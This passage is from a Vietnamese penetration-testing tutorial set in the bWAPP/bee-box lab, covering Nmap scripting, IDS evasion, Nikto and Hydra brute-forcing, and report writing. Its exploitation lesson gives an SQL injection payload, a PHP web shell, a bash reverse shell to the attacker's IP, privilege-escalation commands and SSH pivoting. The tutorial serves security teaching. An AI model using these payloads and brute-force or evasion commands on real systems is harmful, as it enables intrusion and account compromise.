|_  Some Capabilities: ...
```

Có credential (bee-box: `root/bug`) thì đọc sâu hơn:

```bash
sudo nmap -p 3306 --script "mysql-databases,mysql-users" \
     --script-args 'mysqluser=root,mysqlpass=bug' 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `--script-args k=v,k2=v2` | Truyền tham số cho script |

🧠 **Bài học:** NSE không tự "đoán" mật khẩu — bạn phải cung cấp. Đây là công cụ **xác minh**, không phải hack thần kỳ.

### 6.6. NSE cho SSH

```bash
sudo nmap -p 22 --script "ssh-auth-methods,ssh2-enum-algos,ssh-hostkey" 192.168.91.130
```

| Script | Cho biết |
|---|---|
| `ssh-auth-methods` | Server cho đăng nhập bằng `password` hay chỉ `publickey`? |
| `ssh2-enum-algos` | Thuật toán nào được hỗ trợ (CBC, SHA1 = yếu) |
| `ssh-hostkey` | Fingerprint host key |

```
| ssh-auth-methods:
|_  Supported authentication methods: publickey,password
```

🧠 Nếu `password` được bật → Hydra (bài 8) mới có ý nghĩa. Nếu chỉ `publickey` → brute-force vô ích.

### 6.7. NSE kiểm tra lỗ hổng — `vuln`

```bash
sudo nmap -sV -p 22,80,443,3306 --script vuln --script-timeout 90s 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `--script vuln` | Chạy **toàn bộ** script category `vuln` |
| `--script-timeout 90s` | 1 script treo quá 90s thì bỏ, không kéo cả scan |

📋 Kỳ vọng (bee-box, Apache/PHP cũ):

```
| http-shellshock:
|   VULNERABLE: GNU Bash "Shellshock" (CVE-2014-6271)
|     State: LIKELY VULNERABLE
| http-vuln-cve2012-1823:
|   VULNERABLE: PHP-CGI query string parameter injection
|     State: VULNERABLE
```

🚨 **Đọc cho đúng:**

- `State: VULNERABLE` → đã xác nhận.
- `State: LIKELY VULNERABLE` → **chỉ là dấu hiệu**, phải kiểm tra tay bằng `curl`/browser trước khi ghi vào báo cáo.

### 6.8. Các lệnh "meta" của NSE

```bash
nmap --script-help "http-*"          # xem mô tả các script khớp
nmap --script-help http-enum         # xem 1 script
sudo nmap --script-updatedb          # cập nhật DB (sau khi thêm script)
```

🧠 `--script-help` là **cách tốt nhất để học NSE**: nó in mô tả, category, tác giả, ví dụ.

### 6.9. Viết biểu thức script

```bash
sudo nmap -p 80 --script "http-* and not http-brute" 192.168.91.130
sudo nmap -p 80 --script "default or safe" 192.168.91.130
sudo nmap -p 80,443 --script "http-title,http-headers,ssl-cert" 192.168.91.130
```

| Cú pháp | Nghĩa |
|---|---|
| `,` | HOẶC (danh sách) |
| `and` / `or` / `not` | Logic |
| `*` | Wildcard |
| `category` | Tên category (`vuln`, `safe`…) |

### ✍️ Tự làm bài 6

1. Tự tìm 5 script liên quan đến `ftp` bằng `ls | grep`. Đọc mô tả bằng `--script-help`.
2. Chạy `http-enum` rồi tự kiểm tra bằng `curl -I http://192.168.91.130/bWAPP/`. Kết quả có khớp?
3. Chạy `--script vuln` nhưng **chỉ** trên port 80. Mất bao lâu? Có script nào timeout?
4. Vì sao `--script vuln` không nên là lệnh đầu tiên bạn chạy?

<details>
<summary>Đáp án gợi ý</summary>

1. `ftp-anon`, `ftp-brute`, `ftp-syst`, `ftp-vsftpd-backdoor`, `ftp-proftpd-backdoor`.
2. Thường khớp: `http-enum` thấy `/bWAPP/`, curl trả `200` hoặc `302`.
3. Tuỳ máy, thường 1–3 phút; `http-shellshock`/`http-vuln-cve2012-1823` hay chậm.
4. Vì nó ồn ào, chậm, có thể gây hại, và **không biết port nào đang mở** thì chạy chỉ tốn thời gian.
</details>

---

## Bài 7 — UDP & evasion (nâng cao)

### 7.1. UDP — nhắc lại có hệ thống

```bash
sudo nmap -sU --top-ports 50 -T4 --reason 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-sU` | UDP scan |
| `-T4` | UDP rất chậm, cần timing cao hơn |
| `--reason` | Xem lý do (`port-unreach` = closed) |

🧠 Đừng quét `-sU -p-`: 65535 port UDP có thể mất **hàng chục giờ**.

### 7.2. Evasion — hiểu cơ chế, không lạm dụng

```bash
sudo nmap -sS -f -p 80,443 192.168.91.130           # fragment
sudo nmap -sS -D RND:5 -p 80 192.168.91.130         # decoy
sudo nmap -sS --source-port 53 -p 3306 192.168.91.130
sudo nmap -sS --data-length 50 -p 80 192.168.91.130
sudo nmap -sS -T2 --scan-delay 1s -p 1-100 192.168.91.130
sudo nmap -sS -p 80 --packet-trace 192.168.91.130   # xem packet thật
```

| Flag | Cơ chế | Hiệu quả với |
|---|---|---|
| `-f`, `-ff`, `--mtu` | Chia packet nhỏ | Firewall/IDS đọc header đơn giản |
| `-D RND:N` | Trộn IP giả | Làm nhiễu log của victim |
| `--source-port 53` | Giả port nguồn DNS | Firewall chỉ cho DNS ra ngoài |
| `--data-length N` | Đệm dữ liệu | IDS dựa trên kích thước packet |
| `-T2`, `--scan-delay` | Làm chậm | IDS dựa trên rate |
| `--spoof-mac` | Đổi MAC | Chỉ trong LAN |

#### 🧠 `--packet-trace` — công cụ học tốt nhất

Nó in **từng packet** Nmap gửi/nhận. Chạy thử và bạn sẽ thấy đúng cái handshake ở mục 1.4:

```
SENT (0.1s) TCP 192.168.91.128:54321 > 192.168.91.130:80 S ttl=64 id=1 iplen=44
RCVD (0.2s) TCP 192.168.91.130:80 > 192.168.91.128:54321 SA ttl=64 ...
```

> ⚠️ Evasion chỉ để **học**. Dùng decoy/spoof ra ngoài lab là vi phạm pháp luật.

---

## Bài 8 — Nikto & Hydra

Hai tool này **bổ sung** cho Nmap, không thay thế:

- **Nikto**: quét web **sâu** hơn (6700+ mẫu path, cấu hình sai, file mặc định).
- **Hydra**: **xác minh** credential (Nmap chỉ dò được "có cho login bằng password không").

### 8.1. Nikto

```bash
nikto -h http://192.168.91.130 -o nikto.txt -Format txt -maxtime 10m
```

| Flag | Nghĩa |
|---|---|
| `-h` | Host/URL |
| `-o`, `-Format` | Ghi report (`txt`, `html`, `csv`, `xml`) |
| `-maxtime` | Giới hạn thời gian |
| `-ssl` | Dùng HTTPS |
| `-Tuning` | Chọn nhóm test |
| `-Cgidirs all` | Kiểm tra cả thư mục CGI |

`-Tuning` — chọn test nào:

| Nhóm | Nội dung |
|---|---|
| `1` | File/thư mục thú vị |
| `2` | Cấu hình sai |
| `3` | Lộ thông tin |
| `4` | Injection |
| `5` | File ngoài webroot |
| `b` | Cấu hình |
| `d` | Version lỗi thời |
| `e` | Lỗi database |

📋 Output mẫu:

```
+ Server: Apache/2.2.14 (Ubuntu)
+ /bWAPP/: Web application found.
+ /phpmyadmin/: phpMyAdmin directory found.
+ /server-status: Apache status page exposed.
+ OSVDB-877: HTTP TRACE method is active.
+ /bWAPP/db/: Directory indexing enabled.
```

🧠 **Cách đọc:** mỗi dòng `+` = 1 quan sát. Đừng copy 200 dòng vào báo cáo — **nhóm lại** thành finding:

| Nhóm finding | Từ các dòng |
|---|---|
| Information Disclosure | `/server-status`, `/phpmyadmin/`, `directory indexing` |
| Misconfiguration | TRACE active, thiếu header |
| Outdated Component | `Apache/2.2.14` |

### 8.2. Hydra — chỉ khi được phép

**Điều kiện tiên quyết:**

1. `ssh-auth-methods` cho thấy `password` được bật.
2. Bạn có **snapshot** (brute có thể khoá tài khoản).
3. Bạn **được phép** bằng văn bản.

```bash
hydra -l bee -P /usr/share/wordlists/rockyou.txt ssh://192.168.91.130 -t 4 -V -f
```

| Flag | Nghĩa |
|---|---|
| `-l bee` | 1 username (`-L file` = danh sách) |
| `-P file` | Wordlist password (`-p pass` = 1 password) |
| `-t 4` | 4 kết nối song song (SSH dễ drop nếu cao) |
| `-V` | In từng lần thử |
| `-f` | Dừng khi tìm được |
| `-e nsr` | Thử thêm null / username-as-password / reverse |

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.91.130 -t 4 -V -f
```

**HTTP POST form (bWAPP):**

```bash
hydra -l bee -P /usr/share/wordlists/rockyou.txt 192.168.91.130 \
  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid username or password" \
  -t 16 -V -f
```

| Thành phần | Nghĩa |
|---|---|
| `http-post-form` | Module |
| `path` | `/bWAPP/login.php` |
| `body` | `^USER^`/`^PASS^` là placeholder |
| `fail string` | Chuỗi báo **thất bại** |

⚠️ Nếu form có CSRF token → Hydra fail 100%. Đó là **control tốt**, hãy ghi vào báo cáo là "điểm mạnh", không phải "tool kém".

#### 🧠 Vì sao Hydra không "hack được" mọi thứ?

Nó chỉ thử **mật khẩu**. Nếu hệ thống dùng MFA, rate-limit, lockout, key-only → Hydra vô dụng. Đó là lý do pentest thật cần **hiểu cơ chế**, không chỉ chạy tool.

---

## Bài 9 — Từ scan đến khai thác

> 🚨 Phần này phá hệ thống. Chỉ làm trên lab, **đã snapshot**.

### 9.1. Chuẩn bị bWAPP

1. Mở `http://192.168.91.130/bWAPP/`
2. Login `bee / bug`
3. Bấm **`here`** → chọn **`low`**

🧠 Vì sao có bước này? bWAPP có 3 mức bảo vệ: `low` (không phòng thủ), `medium`, `high`. Đây là **môi trường học**, không phải lỗi thật của ứng dụng.

### 9.2. SQL Injection — hiểu payload

Chọn bài **SQL Injection (GET/Search)**, nhập:

```
' OR 1=1-- -
```

#### 🧠 Vì sao payload này hoạt động?

Giả sử code:

```php
$sql = "SELECT * FROM movies WHERE title LIKE '%" . $title . "%'";
```

Bạn nhập `' OR 1=1-- -` → câu SQL thành:

```sql
SELECT * FROM movies WHERE title LIKE '%' OR 1=1-- -%'
```

- `'` đóng chuỗi.
- `OR 1=1` luôn đúng → trả **mọi** dòng.
- `-- -` comment phần còn lại (dấu cách sau `--` bắt buộc trong MySQL).

🧠 **Đây là bài học cốt lõi:** SQLi không phải "nhập ký tự ma thuật", mà là **thoát khỏi ngữ cảnh dữ liệu để chèn lệnh**.

### 9.3. Upload shell — hiểu vì sao nguy hiểm

Chọn **Unrestricted File Upload**, upload file `shell.php`:

```php
<?php echo shell_exec($_GET['c']); ?>
```

Sau đó mở:

```
http://192.168.91.130/bWAPP/images/shell.php?c=id
```

📋 Kết quả: `uid=33(www-data) gid=33(www-data) ...`

🧠 Vì sao thành công? Ứng dụng **không kiểm tra loại file**. Web server chạy PHP trong thư mục upload → file `.php` trở thành **code**, không phải ảnh.

### 9.4. Reverse shell — hiểu luồng

```bash
# Kali
nc -lvnp 4444
```

Payload:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.91.128/4444 0>&1'"); ?>
```

🧠 **Reverse** (máy nạn nhân gọi về Kali) được dùng vì firewall thường **chặn vào** nhưng **cho ra**. Đây là lý do reverse shell phổ biến hơn bind shell.

### 9.5. Privilege escalation — hiểu từng bước

```bash
id
sudo -l
uname -a
cat /etc/passwd | grep -v nologin
find / -perm -4000 -type f 2>/dev/null
```

| Lệnh | Tìm gì |
|---|---|
| `id` | Bạn là ai, thuộc group nào |
| `sudo -l` | Được chạy lệnh gì với quyền root |
| `uname -a` | Kernel version → tra exploit |
| `find -perm -4000` | File SUID (chạy với quyền chủ sở hữu) |

Với bee-box:

```bash
su - root      # mật khẩu: bug
```

🧠 **Bài học:** đây không phải "lỗ hổng kỹ thuật" mà là **credential mặc định** — lỗi vận hành, nhưng hậu quả tương đương Critical.

### 9.6. Pivot — dùng Nmap từ máy đã chiếm

```bash
# Trên bee-box
nmap -sn 192.168.91.0/24
```

Hoặc từ Kali qua tunnel:

```bash
ssh -D 1080 -N -f bee@192.168.91.130
sudo proxychains4 nmap -sT -Pn -n -p 22,80,443 10.0.0.0/24 --open
```

🧠 **Vì sao `-sT -Pn -n`?**

| Flag | Lý do |
|---|---|
| `-sT` | SOCKS chỉ chuyển TCP đã `connect()`, không chuyển raw SYN |
| `-Pn` | ICMP/host discovery không qua proxy |
| `-n` | DNS sẽ đi ra ngoài tunnel → rò rỉ |

---

## Bài 10 — Viết báo cáo

### 10.1. Từ output → finding

| Output thô | Finding |
|---|---|
| `22/tcp open ssh OpenSSH 5.3p1` | Phần mềm lỗi thời, thiếu bản vá |
| `ssh-auth-methods: password` | Cho phép xác thực bằng mật khẩu → brute-force được |
| `http-methods: TRACE` | TRACE bật → XST |
| `http-enum: /phpmyadmin/` | Trang quản trị public |
| `mysql-empty-password: root` | Tài khoản DB không mật khẩu |
| `State: LIKELY VULNERABLE` | **Chưa phải finding** — cần verify |

### 10.2. Mẫu bảng finding

| # | Finding | Mức độ | Bằng chứng | Khuyến nghị |
|---|---|---|---|---|
| 1 | Credential mặc định `bee/bug`, `root/bug` | Critical | Bài 8 Hydra + `su - root` | Đổi mật khẩu, tắt root login, key-only |
| 2 | SQL Injection tại `sqli_1.php?title=` | Critical | Bài 9.2 payload + ảnh | Prepared statement |
| 3 | Unrestricted File Upload → RCE | Critical | Bài 9.3 `?c=id` | Validate MIME + extension, tắt exec trong upload dir |
| 4 | Apache 2.2.14 / PHP cũ (EOL) | High | Bài 4 `-sV` | Nâng cấp |
| 5 | `/server-status`, `/phpmyadmin/` public | High | Bài 6 `http-enum`, Nikto | Giới hạn IP + auth |
| 6 | TRACE bật, directory listing | Medium | Bài 6 `http-methods` | `TraceEnable off`, `Options -Indexes` |
| 7 | Thiếu `X-Frame-Options`, cookie không `HttpOnly` | Medium | `http-headers`, `http-cookie-flags` | Thêm security header |
| 8 | SSH thuật toán yếu | Low | `ssh2-enum-algos` | Cấu hình cipher hiện đại |

### 10.3. Quy tắc viết

1. **Mỗi finding có bằng chứng**: lệnh + output + thời điểm.
2. **Phân biệt** "xác nhận" và "nghi ngờ".
3. **Không ghi CVSS nếu không tính được** — thà ghi "High (ước tính)" còn hơn bịa điểm.
4. **Khuyến nghị phải cụ thể**: không viết "nâng cao bảo mật", viết "nâng Apache lên 2.4.x".

---

## Bài tập tổng hợp

### Bài A — Trinh sát không dùng `-sV`

Chỉ dùng `-sn`, `-sS`, `-p`, `--reason`: xác định bee-box mở những port nào và **giải thích** vì sao mỗi port là `open` (dựa vào `REASON`).

### Bài B — So sánh 3 kiểu quét

Quét cùng 4 port bằng `-sS`, `-sT`, `-sA`. Lập bảng: thời gian, state, reason. Giải thích khác biệt.

### Bài C — Chứng minh `open|filtered`

Chạy `-sU -p 53,111,161`. Port nào `open|filtered`? Dùng `-sV` trên port đó xem có xác nhận được không. Vì sao?

### Bài D — Tự tìm script

Không dùng Google: trong `/usr/share/nmap/scripts`, tìm 2 script:
1. Một script kiểm tra **HTTP methods**.
2. Một script tìm **file backup** (`.bak`, `.old`, `~`).

Đọc `--script-help`, rồi chạy cả hai trên port 80.

### Bài E — Viết finding

Từ output bài D, viết 1 finding đầy đủ (mô tả, mức độ, bằng chứng, khuyến nghị) trong 5 dòng.

### Bài F — Giải thích cho người khác

Giải thích trong 3 câu: vì sao `-sS` cần root, vì sao `-Pn` làm scan chậm hơn, vì sao UDP hay `open|filtered`.

<details>
<summary>Đáp án Bài A</summary>

Dùng `sudo nmap -sS -p- --reason 192.168.91.130`. Các port mở (22, 80, 443, 3306) có `REASON = syn-ack` → server chấp nhận kết nối. Port `closed` có `reset` → máy sống nhưng không có dịch vụ. Port `filtered` có `no-response` → bị chặn.
</details>

<details>
<summary>Đáp án Bài D</summary>

```bash
ls /usr/share/nmap/scripts | grep -E 'http-(methods|backup|config)'
# http-methods.nse
# http-backup-finder.nse
# http-config-backup.nse

nmap --script-help http-methods http-backup-finder
sudo nmap -p 80 --script "http-methods,http-backup-finder" 192.168.91.130
```

`http-methods` cho biết method nào được bật (TRACE/PUT = rủi ro).
`http-backup-finder` + `http-config-backup` tìm file cấu hình bị bỏ quên.
</details>

---

## Cheat sheet

```bash
# ===== TÌM MÁY =====
sudo nmap -sn 192.168.91.0/24
sudo nmap -sn -PS22,80,443 192.168.91.130

# ===== PORT =====
nmap -p 80,443 192.168.91.130
sudo nmap -sS -p- -T4 --min-rate 1000 --reason 192.168.91.130
sudo nmap -sU --top-ports 50 192.168.91.130

# ===== DỊCH VỤ =====
sudo nmap -sV --version-all -p 22,80,443,3306 192.168.91.130
sudo nmap -O --osscan-guess 192.168.91.130

# ===== NSE =====
sudo nmap -sC -sV 192.168.91.130
sudo nmap -p 80 --script "http-title,http-headers,http-methods,http-enum" 192.168.91.130
sudo nmap -p 3306 --script "mysql-info,mysql-empty-password" 192.168.91.130
sudo nmap -p 22 --script "ssh-auth-methods,ssh2-enum-algos" 192.168.91.130
sudo nmap -sV --script vuln --script-timeout 90s 192.168.91.130

# ===== TOOL PHỤ =====
nikto -h http://192.168.91.130 -Tuning 123bde -o nikto.txt
hydra -l bee -P /usr/share/wordlists/rockyou.txt ssh://192.168.91.130 -t 4 -f -V

# ===== PIVOT =====
ssh -D 1080 -N -f bee@192.168.91.130
sudo proxychains4 nmap -sT -Pn -n -p 22,80,443 10.0.0.0/24 --open
```

---

## Từ điển thuật ngữ

| Thuật ngữ | Nghĩa |
|---|---|
| **Port** | Cổng dịch vụ trên máy (0–65535) |
| **Host discovery** | Tìm máy nào đang sống |
| **SYN scan** | Quét nửa kết nối (`-sS`) |
| **Connect scan** | Quét kết nối đầy đủ (`-sT`) |
| **Filtered** | Bị firewall chặn, không phản hồi |
| **Banner** | Dòng chào của dịch vụ, thường chứa tên + version |
| **CPE** | Định danh chuẩn phần mềm, dùng để tra CVE |
| **NSE** | Nmap Scripting Engine |
| **Wordlist** | Danh sách từ để thử (mật khẩu, path…) |
| **Reverse shell** | Máy nạn nhân chủ động kết nối về attacker |
| **Privilege escalation** | Nâng quyền từ user thường lên root |
| **Pivot** | Dùng máy đã chiếm làm bàn đạp vào mạng trong |
| **SOCKS proxy** | Proxy TCP, dùng để chuyển traffic qua tunnel SSH |

---

## Lỗi thường gặp

| Triệu chứng | Nguyên nhân | Cách xử lý |
|---|---|---|
| `-sS` báo "requires root" | Chưa sudo | `sudo` hoặc dùng `-sT` |
| `-sn` không thấy host | Khác subnet / firewall | Kiểm tra VMnet; thử `-Pn`, `-PS` |
| Full port scan treo lâu | Port drop, retry cao | `--max-retries 2 --min-rate 1000 --host-timeout 10m` |
| `-O` báo "no OS matches" | Thiếu port đóng | Thêm `--osscan-guess` |
| NSE treo | Script chờ timeout | `--script-timeout 60s`, chạy từng nhóm |
| `open|filtered` khắp nơi | UDP hoặc firewall drop | Bình thường với UDP; thử `-sV` để xác nhận |
| Hydra SSH fail liên tục | MaxStartups/fail2ban | Giảm `-t 2`, thêm `-W 3` |
| Hydra HTTP form fail 100% | CSRF token | Dùng Burp/script; ghi nhận control tốt |
| proxychains + `-sS` lỗi | SYN cần raw socket | `-sT -Pn -n` |
| bee-box không vào mạng | Đang bridged | Đổi sang VMnet1 host-only |

---

## Phụ lục: script tự động hoá (tuỳ chọn)

> ⛔ **Đừng dùng trước khi học xong Bài 1–6.** Mục đích của bộ script này là **tiết kiệm thời gian khi bạn đã hiểu**, không phải để thay thế việc học.

Sau khi đã hiểu từng lệnh, các file trong `automation/` giúp chạy lại toàn bộ pipeline:

| File | Tương đương các bài |
|---|---|
| `automation/01_nmap_scan.sh` | Bài 1–7 |
| `automation/02_web_and_creds.sh` | Bài 8 |
| `automation/03_pivot_privesc.sh` | Bài 9.5–9.6 |

```bash
chmod +x automation/*.sh
sudo ./automation/01_nmap_scan.sh 192.168.91.130
```

**Bài tập cuối (quan trọng nhất):** mở `automation/01_nmap_scan.sh`, đọc từng dòng, và **giải thích được mọi flag** trong đó. Nếu chưa giải thích được flag nào → quay lại bài tương ứng. Đó là thước đo bạn đã thực sự hiểu.
